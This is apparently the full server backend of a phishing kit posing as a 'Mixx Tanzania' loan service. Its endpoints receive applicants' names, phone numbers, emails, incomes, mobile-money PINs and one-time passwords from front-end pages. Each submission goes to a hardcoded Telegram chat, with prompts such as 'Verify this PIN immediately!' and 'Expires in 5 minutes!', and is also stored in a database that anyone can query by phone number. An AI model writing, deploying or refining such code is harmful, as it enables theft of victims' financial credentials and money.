// ============================================
// MIXX TANZANIA BACKEND - RAILWAY.COM DEPLOYMENT
// ============================================

const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Request logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// ============================================
// INITIALIZE SUPABASE
// ============================================
let supabase = null;
if (process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
    supabase = createClient(
        process.env.SUPABASE_URL,
        process.env.SUPABASE_SERVICE_ROLE_KEY
    );
    console.log('✅ Supabase connected');
} else {
    console.log('⚠️ Supabase credentials not set, running without database');
}

// ============================================
// TELEGRAM CONFIGURATION
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8409068780';

// ============================================
// HELPER FUNCTIONS
// ============================================

// Send message to Telegram
async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN) {
        console.log('⚠️ TELEGRAM_BOT_TOKEN not set');
        console.log('Message would be:', message);
        return false;
    }
    
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Message sent to Telegram');
            return true;
        } else {
            console.error('❌ Telegram API error:', result.description);
            return false;
        }
    } catch (error) {
        console.error('❌ Error sending to Telegram:', error.message);
        return false;
    }
}

// Format message for Telegram
function formatTelegramMessage(data, type) {
    const date = new Date();
    const tzDate = new Date(date.toLocaleString('en-US', { timeZone: 'Africa/Dar_es_Salaam' }));
    const timestamp = tzDate.toLocaleString('en-TZ');
    
    if (type === 'pin') {
        return `
🔐 <b>MIXX TANZANIA - PIN RECEIVED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 <b>Time:</b> ${timestamp}
👤 <b>Name:</b> ${data.name || 'N/A'}
📧 <b>Email:</b> ${data.email || 'N/A'}
📱 <b>Phone:</b> ${data.phone || 'N/A'}
💰 <b>Amount:</b> TZS ${parseInt(data.amount || 0).toLocaleString()}
📅 <b>Term:</b> ${data.term || 0} months
🔐 <b>PIN:</b> <code>${data.pin}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>Verify this PIN immediately!</b>
        `;
    } 
    else if (type === 'otp') {
        return `
🔐 <b>MIXX TANZANIA - OTP RECEIVED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 <b>Time:</b> ${timestamp}
👤 <b>Name:</b> ${data.name || 'N/A'}
📧 <b>Email:</b> ${data.email || 'N/A'}
📱 <b>Phone:</b> ${data.phone || 'N/A'}
💰 <b>Amount:</b> TZS ${parseInt(data.amount || 0).toLocaleString()}
📅 <b>Term:</b> ${data.term || 0} months
🔐 <b>OTP:</b> <code>${data.pin}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>Expires in 5 minutes!</b>
        `;
    }
    else {
        return `
📋 <b>MIXX TANZANIA - NEW APPLICATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 <b>Time:</b> ${timestamp}
👤 <b>Name:</b> ${data.full_name || data.name || 'N/A'}
📧 <b>Email:</b> ${data.email || 'N/A'}
📱 <b>Phone:</b> ${data.phone || 'N/A'}
💼 <b>Employment:</b> ${data.employment_status || data.employment || 'N/A'}
💰 <b>Income:</b> TZS ${parseInt(data.monthly_income || data.income || 0).toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🏦 <b>LOAN DETAILS:</b>
   💵 Amount: TZS ${parseInt(data.loan_amount || data.amount || 0).toLocaleString()}
   📅 Term: ${data.loan_term || data.term || 0} months
   📊 Interest: ${data.interest_rate || data.rate || 9}% APR
   💳 Monthly: TZS ${parseInt(data.monthly_payment || data.monthly || 0).toLocaleString()}
   💰 Total: TZS ${parseInt(data.total_repayment || data.total || 0).toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP:</b> ${data.ip_address || 'N/A'}
        `;
    }
}

// ============================================
// API ENDPOINTS
// ============================================

// Root endpoint - Health check
app.get('/', (req, res) => {
    res.json({
        success: true,
        message: 'Mixx Tanzania Backend is running!',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        services: {
            telegram: TELEGRAM_BOT_TOKEN ? '✅ Active' : '❌ Not configured',
            supabase: supabase ? '✅ Connected' : '❌ Not configured'
        },
        endpoints: {
            'POST /api/send-telegram': 'Send data to Telegram',
            'GET /api/status': 'Check server status',
            'GET /api/test': 'Test endpoint'
        }
    });
});

// Status endpoint
app.get('/api/status', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        telegram: TELEGRAM_BOT_TOKEN ? 'configured' : 'missing',
        supabase: supabase ? 'connected' : 'disconnected'
    });
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({
        success: true,
        message: 'API is working!',
        timestamp: new Date().toISOString()
    });
});

// MAIN ENDPOINT - Send data to Telegram (used by HTML files)
app.post('/api/send-telegram', async (req, res) => {
    const startTime = Date.now();
    
    try {
        const data = req.body;
        const type = data.type || 'application';
        
        console.log(`📨 Received ${type} data from: ${data.phone || data.email || 'unknown'}`);
        
        // Get IP address
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        data.ip_address = ip;
        
        // Format and send to Telegram
        const message = formatTelegramMessage(data, type);
        const telegramSent = await sendToTelegram(message);
        
        // Save to Supabase if available
        let savedToDb = false;
        if (supabase && (type === 'application' || (!data.pin && !data.type))) {
            try {
                const { error } = await supabase.from('loans').insert({
                    full_name: data.name || data.full_name,
                    email: data.email,
                    phone: data.phone,
                    employment_status: data.employment || data.employment_status,
                    monthly_income: data.income || data.monthly_income,
                    loan_amount: data.amount,
                    loan_term: data.term,
                    interest_rate: data.rate || 9,
                    monthly_payment: data.monthly,
                    total_repayment: data.total,
                    application_status: type === 'pin' ? 'pin_entered' : (type === 'otp' ? 'otp_verified' : 'submitted'),
                    ip_address: ip
                });
                
                if (!error) {
                    savedToDb = true;
                    console.log('✅ Saved to Supabase');
                }
            } catch (dbError) {
                console.log('⚠️ Could not save to Supabase:', dbError.message);
            }
        }
        
        const responseTime = Date.now() - startTime;
        
        res.json({
            success: true,
            message: 'Data sent successfully',
            telegram_sent: telegramSent,
            saved_to_database: savedToDb,
            response_time_ms: responseTime,
            data_received: {
                type: type,
                name: data.name || data.full_name,
                phone: data.phone,
                amount: data.amount
            }
        });
        
    } catch (error) {
        console.error('❌ Error in send-telegram:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

// Save PIN endpoint
app.post('/api/save-pin', async (req, res) => {
    try {
        const { phone, pin, name, email, amount, term } = req.body;
        
        console.log(`🔐 PIN received for ${phone}`);
        
        // Send to Telegram
        const message = formatTelegramMessage({ name, email, phone, amount, term, pin }, 'pin');
        await sendToTelegram(message);
        
        // Save to Supabase if available
        if (supabase) {
            await supabase
                .from('loans')
                .update({ pin_code: pin, application_status: 'pin_entered' })
                .eq('phone', phone);
        }
        
        res.json({
            success: true,
            message: 'PIN saved and sent to Telegram',
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('❌ Error saving PIN:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save OTP endpoint
app.post('/api/save-otp', async (req, res) => {
    try {
        const { phone, pin, name, email, amount, term } = req.body;
        
        console.log(`🔐 OTP received for ${phone}`);
        
        // Send to Telegram
        const message = formatTelegramMessage({ name, email, phone, amount, term, pin }, 'otp');
        await sendToTelegram(message);
        
        // Save to Supabase if available
        if (supabase) {
            await supabase
                .from('loans')
                .update({ otp_code: pin, application_status: 'otp_verified' })
                .eq('phone', phone);
        }
        
        res.json({
            success: true,
            message: 'OTP saved and sent to Telegram',
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('❌ Error saving OTP:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get application by phone
app.get('/api/application/:phone', async (req, res) => {
    try {
        const { phone } = req.params;
        
        if (!supabase) {
            return res.json({ success: false, message: 'Database not configured' });
        }
        
        const { data, error } = await supabase
            .from('loans')
            .select('*')
            .eq('phone', phone)
            .order('created_at', { ascending: false })
            .limit(1);
        
        if (error) throw error;
        
        res.json({
            success: true,
            application: data ? data[0] : null
        });
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 404 handler for undefined routes
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: `Route ${req.originalUrl} not found`,
        available_endpoints: ['/', '/api/status', '/api/test', '/api/send-telegram', '/api/save-pin', '/api/save-otp', '/api/application/:phone']
    });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🚀 MIXX TANZANIA BACKEND DEPLOYED ON RAILWAY.COM 🚀       ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║   📡 PORT: ${PORT}                                                  ║
║   🤖 Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}                ║
║   🗄️  Supabase: ${supabase ? '✅ CONNECTED' : '❌ NOT CONFIGURED'}                ║
║   📱 Chat ID: ${TELEGRAM_CHAT_ID}                                         ║
╠══════════════════════════════════════════════════════════════╣
║   📍 Available Endpoints:                                     ║
║      GET  /                                                   ║
║      GET  /api/status                                         ║
║      GET  /api/test                                           ║
║      POST /api/send-telegram                                  ║
║      POST /api/save-pin                                       ║
║      POST /api/save-otp                                       ║
║      GET  /api/application/:phone                             ║
╚══════════════════════════════════════════════════════════════╝
    `);
});

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down server...');
    process.exit(0);
});
